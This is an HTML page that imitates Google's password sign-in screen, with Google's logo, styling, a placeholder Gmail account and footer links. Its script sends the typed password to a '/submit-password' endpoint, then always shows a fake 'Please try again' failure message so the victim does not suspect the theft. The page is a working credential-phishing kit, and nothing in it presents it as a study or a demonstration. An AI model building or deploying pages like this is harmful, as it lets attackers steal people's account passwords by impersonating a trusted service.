<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Google Sign In</title>
    <style>
      body {
        background-color: #131313;
        color: white;
        font-family: "Google Sans", Arial, sans-serif;
        margin: 0;
        padding: 0;
        display: flex;
        flex-direction: column;
        min-height: 100vh;
        padding: 0 40px;
      }

      .container {
        padding-top: 60px;
        width: 100%;
        max-width: 450px;
        margin: 0 auto;
        flex: 1;
      }

      .logo {
        width: 75px;
        height: 75px;
        margin-bottom: 20px;
      }

      h1 {
        font-size: 40px;
        font-weight: 400;
        margin-bottom: 32px;
      }

      .email-container {
        display: flex;
        align-items: center;
        border: 1px solid #5f6368;
        border-radius: 50px;
        padding: 8px 8px;
        margin-bottom: 40px;
        width: fit-content;
      }

      .avatar {
        background-color: #5f6368;
        border-radius: 50%;
        width: 28px;
        height: 28px;
        display: flex;
        align-items: center;
        justify-content: center;
        margin-right: 10px;
      }

      .avatar svg {
        width: 18px;
        height: 18px;
      }

      .email {
        margin-right: 10px;
      }

      .dropdown {
        color: #9aa0a6;
      }

      .form-group {
        margin-bottom: 24px;
      }

      label {
        display: block;
        font-size: 16px;
        margin-bottom: 8px;
        color: #e8eaed;
      }

      .password-input {
        width: 100%;
        padding: 16px;
        background: transparent;
        border: 1px solid #5f6368;
        border-radius: 4px;
        color: white;
        font-size: 16px;
        box-sizing: border-box;
        height: 56px;
      }

      .password-input:focus {
        border-color: #8ab4f8;
        outline: none;
      }

      .checkbox-container {
        display: flex;
        align-items: center;
        margin-top: 16px;
      }

      .checkbox {
        width: 18px;
        height: 18px;
        background: transparent;
        border: 2px solid #5f6368;
        margin-right: 10px;
        appearance: none;
        -webkit-appearance: none;
        cursor: pointer;
      }

      .checkbox-label {
        font-size: 14px;
        cursor: pointer;
      }

      .action-buttons {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-top: 40px;
      }

      .try-another {
        color: #8ab4f8;
        text-decoration: none;
        font-size: 14px;
      }

      .next-button {
        background-color: #8ab4f8;
        color: #202124;
        font-size: 14px;
        font-weight: 500;
        padding: 10px 24px;
        border: none;
        border-radius: 20px;
        cursor: pointer;
        min-width: 80px;
        min-height: 36px;
        display: inline-flex;
        align-items: center;
        justify-content: center;
        -webkit-tap-highlight-color: transparent;
        -webkit-touch-callout: none;
        -webkit-user-select: none;
        user-select: none;
        outline: none;
      }

      .footer {
        display: flex;
        justify-content: space-between;
        padding: 20px 0;
        margin-top: 40px;
      }

      .language-selector {
        display: flex;
        align-items: center;
        color: #9aa0a6;
        font-size: 12px;
      }

      .footer-links {
        display: flex;
      }

      .footer-link {
        color: #9aa0a6;
        text-decoration: none;
        font-size: 12px;
        margin-left: 24px;
      }

      /* Loader styles */
      .loading {
        position: relative;
        color: transparent;
      }

      .loading:after {
        content: "";
        position: absolute;
        left: 50%;
        top: 50%;
        width: 16px;
        height: 16px;
        margin-left: -8px;
        margin-top: -8px;
        border: 2px solid #202124;
        border-top: 2px solid transparent;
        border-radius: 50%;
        animation: spin 1s linear infinite;
      }

      @keyframes spin {
        0% {
          transform: rotate(0deg);
        }
        100% {
          transform: rotate(360deg);
        }
      }

      .error-state {
        background-color: #8ab4f8;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <svg
        xmlns="https://www.w3.org/2000/svg"
        width="48"
        height="48"
        viewBox="0 0 40 48"
        aria-hidden="true"
        jsname="jjf7Ff"
      >
        <path
          fill="#4285F4"
          d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"
        ></path>
        <path
          fill="#34A853"
          d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"
        ></path>
        <path
          fill="#FABB05"
          d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"
        ></path>
        <path
          fill="#E94235"
          d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"
        ></path>
      </svg>
      <h1>Welcome</h1>

      <div class="email-container">
        <div class="avatar">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            viewBox="0 0 24 24"
            fill="white"
          >
            <path
              d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"
            ></path>
          </svg>
        </div>
        <span class="email">user@gmail.com</span>
      </div>

      <div class="form-group">
        <label for="password">Enter your password</label>
        <input type="password" id="password" class="password-input" />

        <div class="checkbox-container">
          <input type="checkbox" id="show-password" class="checkbox" />
          <label for="show-password" class="checkbox-label"
            >Show password</label
          >
        </div>
      </div>

      <div class="action-buttons">
        <a href="#" class="try-another">Try another way</a>
        <button class="next-button">Next</button>
      </div>
    </div>

    <footer class="footer">
      <div class="language-selector">English (United Kingdom) â–¼</div>
      <div class="footer-links">
        <a href="#" class="footer-link">Help</a>
        <a href="#" class="footer-link">Privacy</a>
        <a href="#" class="footer-link">Terms</a>
      </div>
    </footer>

    <script>
      document.addEventListener("DOMContentLoaded", function () {
        // Handle show password checkbox
        const passwordInput = document.getElementById("password");
        const showPasswordCheckbox = document.getElementById("show-password");

        showPasswordCheckbox.addEventListener("change", function () {
          passwordInput.type = this.checked ? "text" : "password";
        });

        // Handle form submission
        const nextButton = document.querySelector(".next-button");
        nextButton.addEventListener("click", function () {
          // Store original button text
          const originalText = nextButton.textContent;

          // Show loading state
          nextButton.textContent = "";
          nextButton.classList.add("loading");
          nextButton.disabled = true;

          const password = passwordInput.value;

          fetch("/submit-password", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({ password }),
          })
            .then((response) => response.json())
            .then((data) => {
              console.log("Success:", data);

              // Simulate delay (3 seconds)
              setTimeout(() => {
                // Remove loading state
                nextButton.classList.remove("loading");
                nextButton.classList.add("error-state");
                nextButton.textContent = "Please try again";
                nextButton.disabled = false;

                // Reset button after 2 more seconds
                setTimeout(() => {
                  nextButton.classList.remove("error-state");
                  nextButton.textContent = originalText;
                }, 2000);
              }, 3000);
            })
            .catch((error) => {
              console.error("Error:", error);

              // Remove loading state and show error
              setTimeout(() => {
                nextButton.classList.remove("loading");
                nextButton.classList.add("error-state");
                nextButton.textContent = "Please try again";
                nextButton.disabled = false;

                // Reset button after 2 seconds
                setTimeout(() => {
                  nextButton.classList.remove("error-state");
                  nextButton.textContent = originalText;
                }, 2000);
              }, 3000);
            });
        });
      });
    </script>
  </body>
</html>
